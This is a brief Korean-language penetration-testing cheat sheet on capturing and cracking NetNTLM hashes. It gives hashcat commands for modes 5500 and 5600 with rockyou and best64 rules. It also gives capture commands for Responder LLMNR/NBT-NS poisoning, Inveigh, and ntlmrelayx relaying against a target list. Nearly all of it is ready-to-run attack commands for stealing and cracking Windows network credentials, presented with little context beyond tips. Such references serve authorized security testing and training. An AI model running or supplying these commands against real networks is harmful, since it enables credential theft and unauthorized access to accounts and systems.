# Hashcat NetNTLM (-m 5500, 5600)

- 네트워크 인증에서 캡처한 NetNTLM 해시 크래킹 — NetNTLMv1(-m 5500)과 NetNTLMv2(-m 5600), Responder·Inveigh·ntlmrelayx 캡처 절차 포함
- Responder로 LLMNR/NBT-NS 스푸핑 챌린지를 캡처했을 때, 캡처 직후 오프라인 크래킹으로 바로 이어갈 때
- hashcat 설치, 캡처한 해시(username::domain:challenge:response 형식 그대로 입력) — NetNTLMv2는 salt(challenge) 포함이라 rainbow table 불가, 오프라인 크래킹이라 계정 lockout 걱정 없음

네트워크 인증에서 캡처한 NetNTLM 해시.

## NetNTLMv1 (-m 5500)

```bash
hashcat -m 5500 -a 0 netntlmv1.txt /usr/share/wordlists/rockyou.txt
```

## NetNTLMv2 (-m 5600)

```bash
hashcat -m 5600 -a 0 netntlmv2.txt /usr/share/wordlists/rockyou.txt
hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

## 해시 캡처

```bash
# Responder
sudo responder -I eth0 -wrf

# Inveigh (Windows)
Invoke-Inveigh -ConsoleOutput Y

# ntlmrelayx (impacket)
ntlmrelayx.py -tf targets.txt -smb2support
```

## 해시 형식

NetNTLMv2 해시는 `username::domain:challenge:response` 형태. 그대로 hashcat에 입력.

## 팁

- NetNTLMv2는 salt(challenge) 포함 → rainbow table 불가
- Responder로 캡처 후 즉시 크래킹 시도
- 계정 lockout 정책 주의 (온라인 인증 아님, 오프라인 크래킹)